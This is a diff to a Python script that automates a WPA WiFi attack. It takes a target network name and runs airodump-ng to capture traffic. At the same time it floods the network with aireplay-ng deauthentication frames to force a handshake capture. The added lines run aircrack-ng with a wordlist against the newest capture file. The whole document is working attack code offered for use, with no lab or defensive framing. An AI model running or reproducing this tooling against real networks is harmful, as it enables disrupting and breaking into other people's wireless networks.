@@ -7,6 +7,7 @@ import math
 import re
 import time
 import sys
+import glob
 
 # bssid = str()
 # channel = str()
@@ -17,8 +18,7 @@ import sys
 # 	print(bs)
 name = input("Input name wifi: ")
 print("Target:", name)
-
-print("---------------------------------")
+time.sleep(1.5)
 def setup_device():
     global bssid
     global channel
@@ -65,12 +65,12 @@ def setup_device():
 def getBssidCH(bs, ch):
     try:
         print('------------------------------')
-        os.system('airodump-ng --bssid {bssid} -c {channel} --write WPAcrack wlan0mon'.format(bssid = bs, channel = ch))
+        os.system('airodump-ng --bssid {bssid} -c {channel} --write WPAcrack --output-format cap wlan0mon'.format(bssid = bs, channel = ch))
     except:
         print("Error1")
         
 def getDump(bs):
-    time.sleep(10)#checking
+    time.sleep(5)#checking
     try:
         os.system('aireplay-ng --deauth 100 -a {bssid} wlan0mon'.format(bssid = bs))
     except:
@@ -78,13 +78,16 @@ def getDump(bs):
 
 
 setup_device()
-time.sleep(3)
+time.sleep(1)
 t1 = threading.Thread(target=getBssidCH, args=(bssid, channel,))
 t2 = threading.Thread(target=getDump, args=(bssid,))
 # print(bssid)
 # print(channel)
 t1.start()
 t2.start()
-time.sleep(35)
+time.sleep(65)
 os.system('airmon-ng stop wlan0mon')
+l = glob.glob("*.cap")
+fl = max(l)
+os.system('aircrack-ng {file} -w /home/van/Desktop/test.txt'.format(file=fl))
 print('crack over')
